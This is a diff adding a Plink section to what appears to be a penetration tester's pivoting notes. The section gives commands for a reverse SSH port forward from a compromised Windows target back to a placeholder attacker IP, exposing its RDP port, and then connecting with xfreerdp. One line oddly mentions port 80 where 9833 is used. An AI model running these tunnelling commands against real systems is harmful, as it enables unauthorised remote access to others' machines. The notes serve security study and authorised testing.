@@ -160,3 +160,18 @@ ssh -N -R 9998 kali@$(IP_ADDRESS)
 ## Plink
 CLI version of Putty.
 
+Steps:
+1. Transfer Plink to target. Located in /usr/share/windows-resources/binaries/plink.exe on kali.
+2. (Optional) Create new user as the creds of this user will be left in logs on the target machine.
+3. Start ssh server on kali:
+```bash
+sudo systemctl start ssh
+```
+4. Run plink remote port forward command on target:
+```bash
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 $(ATTACKER_IP)
+```
+We can now do RDP to the target through port 80 on the target machine (bound to port 9833 on kali):
+```
+xfreerdp /u:$(USERNAME) /p:$(PASSWORD) /v:127.0.0.1:9833
+```
